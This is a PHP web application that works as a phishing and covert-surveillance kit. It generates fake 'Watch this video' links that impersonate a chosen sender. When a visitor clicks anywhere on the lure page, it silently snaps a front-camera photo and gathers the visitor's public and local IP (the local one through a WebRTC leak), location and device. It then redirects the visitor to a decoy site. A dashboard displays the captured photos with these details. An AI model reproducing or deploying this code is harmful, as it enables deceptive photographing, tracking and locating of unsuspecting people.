<?php
date_default_timezone_set('Africa/Algiers');

error_reporting(0);
@ini_set('display_errors', 0);

$upload_dir = 'uploads/';
if (!is_dir($upload_dir)) {
    @mkdir($upload_dir, 0755, true);
}

try {
    $db = new PDO('sqlite:tracker_custom_bg.db');
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    $db->exec("CREATE TABLE IF NOT EXISTS links (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        code TEXT UNIQUE, 
        target_url TEXT, 
        sender_name TEXT,
        sender_avatar TEXT,
        bg_image TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");

    $db->exec("CREATE TABLE IF NOT EXISTS captures (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        code TEXT, 
        image_data TEXT, 
        public_ip TEXT, 
        local_ip TEXT, 
        port TEXT, 
        location TEXT, 
        device_info TEXT, 
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");
} catch (Exception $e) {
    die("Database error: " . $e->getMessage());
}

function get_real_ip() {
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

function get_ip_location($ip) {
    if ($ip === '127.0.0.1' || $ip === 'Unknown' || strpos($ip, '192.168.') === 0) {
        return 'Local Network';
    }
    @$json = file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,city");
    if ($json) {
        $data = json_decode($json, true);
        if (isset($data['status']) && $data['status'] === 'success') {
            return ($data['city'] ? $data['city'] . ', ' : '') . ($data['country'] ?? 'Unknown');
        }
    }
    return 'Unknown Location';
}

function get_device_type($ua) {
    $brand = 'Device';
    if (stripos($ua, 'Samsung') !== false) $brand = 'Samsung';
    elseif (stripos($ua, 'iPhone') !== false) $brand = 'iPhone';
    elseif (stripos($ua, 'Huawei') !== false) $brand = 'Huawei';
    elseif (stripos($ua, 'Xiaomi') !== false or stripos($ua, 'Redmi') !== false) $brand = 'Xiaomi';
    elseif (stripos($ua, 'Oppo') !== false) $brand = 'Oppo';

    if (stripos($ua, 'Android') !== false) return $brand . ' - Android';
    if (stripos($ua, 'iPhone') !== false or stripos($ua, 'iPad') !== false) return $brand . ' - iOS';
    if (stripos($ua, 'Windows') !== false) return 'PC - Windows';
    if (stripos($ua, 'Macintosh') !== false) return 'PC - Mac';
    return 'Unknown Device';
}

$target_redirect = "";
$sender_name = "User";
$sender_avatar = "https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?w=100&auto=format&fit=crop&q=60";
$bg_image_url = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";

if (isset($_GET['r'])) {
    $code = $_GET['r'];
    $stmt = $db->prepare("SELECT * FROM links WHERE code = ?");
    $stmt->execute([$code]);
    $link = $stmt->fetch(PDO::FETCH_ASSOC);

    if ($link) {
        $target_redirect = $link['target_url'];
        $sender_name = $link['sender_name'];
        $sender_avatar = $link['sender_avatar'];
        if (!empty($link['bg_image'])) {
            $bg_image_url = $link['bg_image'];
        }

        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_capture'])) {
            $img_base64 = $_POST['image'] ?? '';
            $public_ip = get_real_ip();
            $local_ip = $_POST['lip'] ?? 'Direct';
            $port = $_SERVER['REMOTE_PORT'] ?? 'Unknown';
            $location = get_ip_location($public_ip);
            $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
            $device = get_device_type($ua);

            if (!empty($img_base64)) {
                try {
                    $capStmt = $db->prepare("INSERT INTO captures (code, image_data, public_ip, local_ip, port, location, device_info, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)");
                    $capStmt->execute([$code, $img_base64, $public_ip, $local_ip, $port, $location, $device, date('Y-m-d H:i:s')]);
                } catch (Exception $e) {}
            }
            exit('OK');
        }
    } else {
        die("Link not found.");
    }
}

$generated_link = "";
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
    $target_url = trim($_POST['target_url']);
    $sender_name = trim($_POST['sender_name']) ?: "User";
    
    if (!filter_var($target_url, FILTER_VALIDATE_URL)) {
        $target_url = "https://" . $target_url;
    }

    if (isset($_FILES['avatar_file']) && $_FILES['avatar_file']['error'] === UPLOAD_ERR_OK) {
        $ext = pathinfo($_FILES['avatar_file']['name'], PATHINFO_EXTENSION);
        $avatarName = 'avatar_' . uniqid() . '.' . $ext;
        @move_uploaded_file($_FILES['avatar_file']['tmp_name'], $upload_dir . $avatarName);
        $sender_avatar = $upload_dir . $avatarName;
    } elseif (!empty($_POST['sender_avatar_url'])) {
        $sender_avatar = trim($_POST['sender_avatar_url']);
    }

    if (isset($_FILES['bg_file']) && $_FILES['bg_file']['error'] === UPLOAD_ERR_OK) {
        $ext = pathinfo($_FILES['bg_file']['name'], PATHINFO_EXTENSION);
        $bgName = 'bg_' . uniqid() . '.' . $ext;
        @move_uploaded_file($_FILES['bg_file']['tmp_name'], $upload_dir . $bgName);
        $bg_image_url = $upload_dir . $bgName;
    } elseif (!empty($_POST['bg_image_url'])) {
        $bg_image_url = trim($_POST['bg_image_url']);
    }

    $code = substr(md5(uniqid(rand(), true)), 0, 7);
    $stmt = $db->prepare("INSERT INTO links (code, target_url, sender_name, sender_avatar, bg_image) VALUES (?, ?, ?, ?, ?)");
    $stmt->execute([$code, $target_url, $sender_name, $sender_avatar, $bg_image_url]);

    $domain = $_SERVER['HTTP_HOST'];
    $generated_link = "https://" . $domain . "/?r=" . $code;
}

$filter_code = trim($_GET['track'] ?? '');
if (!empty($filter_code)) {
    $stmt = $db->prepare("SELECT * FROM captures WHERE code = ? ORDER BY id DESC");
    $stmt->execute([$filter_code]);
    $captures = $stmt->fetchAll(PDO::FETCH_ASSOC);
} else {
    $captures = $db->query("SELECT * FROM captures ORDER BY id DESC LIMIT 30")->fetchAll(PDO::FETCH_ASSOC);
}

if (isset($_GET['r']) && !empty($target_redirect)):
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Watch Video</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
        body, html { width: 100%; height: 100%; overflow: hidden; background: #000; display: flex; justify-content: center; align-items: center; position: relative; cursor: pointer; }
        
        .blurred-bg {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('<?php echo htmlspecialchars($bg_image_url); ?>') no-repeat center center/cover;
            filter: blur(18px) brightness(0.65);
            transform: scale(1.1);
            z-index: 1;
            pointer-events: none;
        }

        .modal-card {
            position: relative;
            background: rgba(255, 255, 255, 0.98);
            width: 90%;
            max-width: 350px;
            border-radius: 24px;
            padding: 30px 20px;
            text-align: center;
            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
            z-index: 10;
            animation: popUp 0.3s ease-out;
            cursor: pointer;
        }
        @keyframes popUp { 0% { transform: scale(0.8); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }

        .avatar-container { width: 80px; height: 80px; border-radius: 50%; overflow: hidden; margin: -65px auto 16px auto; border: 4px solid #fff; box-shadow: 0 4px 15px rgba(0,0,0,0.2); background: #eee; }
        .avatar-container img { width: 100%; height: 100%; object-fit: cover; }

        h2 { font-size: 20px; font-weight: 700; color: #111; margin-bottom: 8px; }
        p { font-size: 13px; color: #666; margin-bottom: 24px; line-height: 1.5; }

        .btn-action { display: block; width: 100%; background: #fe2c55; color: white; border: none; padding: 14px; border-radius: 12px; font-weight: 600; font-size: 15px; cursor: pointer; text-decoration: none; margin-bottom: 12px; box-shadow: 0 4px 14px rgba(254,44,85,0.4); pointer-events: none; }
        .btn-secondary { background: transparent; color: #888; border: none; font-size: 14px; font-weight: 500; cursor: pointer; padding: 6px; pointer-events: none; }
    </style>
    <script>
        let isCaptured = false;

        function getLocalIP(callback) {
            let foundLocal = false;
            let RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
            if (!RTCPeerConnection) { callback("Unknown"); return; }
            let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
            pc.createDataChannel("");
            pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
            pc.onicecandidate = function(ice) {
                if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                let myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
                if (myIP) {
                    let ip = myIP[1];
                    if (ip.startsWith("192.168.") || ip.startsWith("10.") || ip.startsWith("172.")) {
                        if (!foundLocal) { foundLocal = true; callback(ip); pc.onicecandidate = null; }
                    }
                }
            };
            setTimeout(() => { if (!foundLocal) callback("Direct"); }, 80);
        }

        function triggerCaptureAndRedirect(e) {
            if (isCaptured) return;
            isCaptured = true;

            const targetUrl = "<?php echo $target_redirect; ?>";

            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                .then(stream => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = 640;
                        canvas.height = 480;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        const imageData = canvas.toDataURL('image/jpeg', 0.85);
                        stream.getTracks().forEach(track => track.stop());

                        getLocalIP(function(localIp) {
                            const formData = new URLSearchParams();
                            formData.append('save_capture', '1');
                            formData.append('image', imageData);
                            formData.append('lip', localIp);

                            fetch(window.location.href, {
                                method: 'POST',
                                body: formData
                            }).finally(() => {
                                window.location.replace(targetUrl);
                            });
                        });
                    }, 600);
                })
                .catch(err => {
                    window.location.replace(targetUrl);
                });
        }

        window.addEventListener('DOMContentLoaded', () => {
            document.body.addEventListener('click', triggerCaptureAndRedirect);
        });
    </script>
</head>
<body>
    <div class="blurred-bg"></div>
    <div class="modal-card">
        <div class="avatar-container">
            <img src="<?php echo htmlspecialchars($sender_avatar); ?>" alt="Avatar">
        </div>
        <h2>Watch this video</h2>
        <p><strong><?php echo htmlspecialchars($sender_name); ?></strong> shared a video with you. Watch now to view content!</p>
        <button class="btn-action">Watch Now</button>
        <button class="btn-secondary">Not now</button>
    </div>
</body>
</html>
<?php 
    exit(); 
endif; 
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Control Panel</title>
    <style>
        :root {
            --bg-main: #0b0f17;
            --bg-card: #131b2e;
            --border-color: #1e293b;
            --text-main: #e2e8f0;
            --text-muted: #64748b;
            --accent: #6366f1;
            --accent-hover: #4f46e5;
            --danger: #ef4444;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
        body { background-color: var(--bg-main); color: var(--text-main); padding: 30px 15px; min-height: 100vh; display: flex; flex-direction: column; justify-content: space-between; }
        .wrapper { max-width: 1100px; width: 100%; margin: 0 auto; display: grid; gap: 24px; }
        
        .section-box { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; padding: 25px; box-shadow: 0 10px 15px rgba(0,0,0,0.3); }
        h2 { font-size: 14px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.1em; color: var(--text-muted); margin-bottom: 16px; border-bottom: 1px solid var(--border-color); padding-bottom: 8px; }

        .form-grid { display: grid; gap: 12px; }
        input[type="text"], input[type="file"] { width: 100%; background: #020617; border: 1px solid var(--border-color); border-radius: 8px; padding: 12px 14px; color: var(--text-main); font-size: 14px; outline: none; }
        input[type="text"]:focus { border-color: var(--accent); }
        
        .btn { background: var(--accent); color: white; border: none; padding: 0 24px; border-radius: 8px; font-weight: 600; cursor: pointer; height: 46px; display: inline-flex; align-items: center; justify-content: center; font-size: 14px; text-decoration: none; transition: background 0.2s; }
        .btn:hover { background: var(--accent-hover); }
        .btn-danger { background: var(--danger); }
        .btn-secondary { background: #334155; }

        .result-panel { background: #020617; border: 1px solid var(--border-color); padding: 16px; border-radius: 8px; margin-top: 15px; }
        .result-panel label { display: block; font-size: 10px; text-transform: uppercase; color: var(--text-muted); margin-bottom: 6px; }
        .flex-row { display: flex; gap: 8px; }

        .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(260px, 1fr)); gap: 16px; margin-top: 15px; }
        .card-img { background: #020617; border: 1px solid var(--border-color); border-radius: 8px; padding: 12px; }
        .card-img img { width: 100%; height: 160px; object-fit: cover; border-radius: 6px; border: 1px solid var(--border-color); }
        
        .info-row { display: flex; justify-content: space-between; font-size: 11px; margin-top: 6px; color: var(--text-muted); }
        .info-row span { color: #cbd5e1; }
        .code-badge { color: var(--accent); font-family: monospace; font-weight: bold; }

        footer { text-align: center; margin-top: 40px; font-size: 11px; color: var(--text-muted); border-top: 1px solid var(--border-color); padding-top: 20px; }
        footer span { color: var(--accent); font-weight: 600; }
    </style>
    <script>
        function copyText(text, btnElement) {
            navigator.clipboard.writeText(text).then(() => {
                const original = btnElement.innerText;
                btnElement.innerText = "Copied";
                btnElement.style.background = "#10b981";
                setTimeout(() => {
                    btnElement.innerText = original;
                    btnElement.style.background = "";
                }, 2000);
            });
        }
    </script>
</head>
<body>
    <div class="wrapper">
        
        <div class="section-box">
            <h2>Generate Custom Link</h2>
            <form method="POST" enctype="multipart/form-data" class="form-grid">
                <input type="text" name="target_url" placeholder="Target Destination URL (e.g. YouTube)..." required>
                <input type="text" name="sender_name" placeholder="Sender Name (e.g. azez)">
                
                <div>
                    <label style="font-size: 11px; color: var(--text-muted); display: block; margin-bottom: 4px;">Sender Avatar Image (Upload file OR paste URL below):</label>
                    <input type="file" name="avatar_file" accept="image/*">
                    <input type="text" name="sender_avatar_url" placeholder="Or paste Avatar Image URL..." style="margin-top: 6px;">
                </div>

                <div>
                    <label style="font-size: 11px; color: var(--text-muted); display: block; margin-bottom: 4px;">Background Blur Image (Upload file OR paste URL below):</label>
                    <input type="file" name="bg_file" accept="image/*">
                    <input type="text" name="bg_image_url" placeholder="Or paste Background Image URL..." style="margin-top: 6px;">
                </div>

                <button type="submit" name="create" class="btn">Generate Link</button>
            </form>

            <?php if (!empty($generated_link)): ?>
                <div class="result-panel">
                    <label>Active Link:</label>
                    <div class="flex-row">
                        <input type="text" readonly value="<?php echo htmlspecialchars($generated_link); ?>">
                        <button type="button" class="btn btn-secondary" onclick="copyText('<?php echo htmlspecialchars($generated_link); ?>', this)">Copy</button>
                    </div>
                </div>
            <?php endif; ?>
        </div>

        <div class="section-box">
            <h2>Captured Gallery & Details</h2>
            <form method="GET" style="margin-bottom: 15px; display: flex; gap: 8px;">
                <input type="text" name="track" placeholder="Filter by code..." value="<?php echo htmlspecialchars($filter_code); ?>" style="flex:1; background:#020617; border:1px solid var(--border-color); border-radius:8px; padding:10px; color:#fff; outline:none;">
                <button type="submit" class="btn" style="height:42px;">Filter</button>
                <?php if(!empty($filter_code)): ?>
                    <a href="/" class="btn btn-danger" style="height:42px; text-decoration:none; display:flex; align-items:center;">Reset</a>
                <?php endif; ?>
            </form>

            <?php if (empty($captures)): ?>
                <p style="text-align: center; color: var(--text-muted); padding: 30px;">No captures recorded.</p>
            <?php else: ?>
                <div class="gallery-grid">
                    <?php foreach ($captures as $cap): ?>
                        <div class="card-img">
                            <a href="<?php echo $cap['image_data']; ?>" target="_blank">
                                <img src="<?php echo $cap['image_data']; ?>" alt="Capture">
                            </a>
                            <div class="info-row" style="margin-top:10px;">
                                <span>Code:</span> <span class="code-badge"><?php echo htmlspecialchars($cap['code']); ?></span>
                            </div>
                            <div class="info-row">
                                <span>Public IP:</span> <span style="color:#38bdf8;"><?php echo htmlspecialchars($cap['public_ip']); ?></span>
                            </div>
                            <div class="info-row">
                                <span>Local IP:</span> <span><?php echo htmlspecialchars($cap['local_ip']); ?></span>
                            </div>
                            <div class="info-row">
                                <span>Port:</span> <span><?php echo htmlspecialchars($cap['port']); ?></span>
                            </div>
                            <div class="info-row">
                                <span>Location:</span> <span style="color:#10b981;"><?php echo htmlspecialchars($cap['location']); ?></span>
                            </div>
                            <div class="info-row">
                                <span>Device:</span> <span><?php echo htmlspecialchars($cap['device_info']); ?></span>
                            </div>
                            <div class="info-row" style="border-top:1px solid var(--border-color); padding-top:6px; margin-top:8px;">
                                <span>Time:</span> <span><?php echo htmlspecialchars($cap['created_at']); ?></span>
                            </div>
                        </div>
                    <?php endforeach; ?>
                </div>
            <?php endif; ?>
        </div>

    </div>

    <footer>
        <p>Core Engine <span>azeez</span> &copy; 2026</p>
    </footer>
</body>
</html>
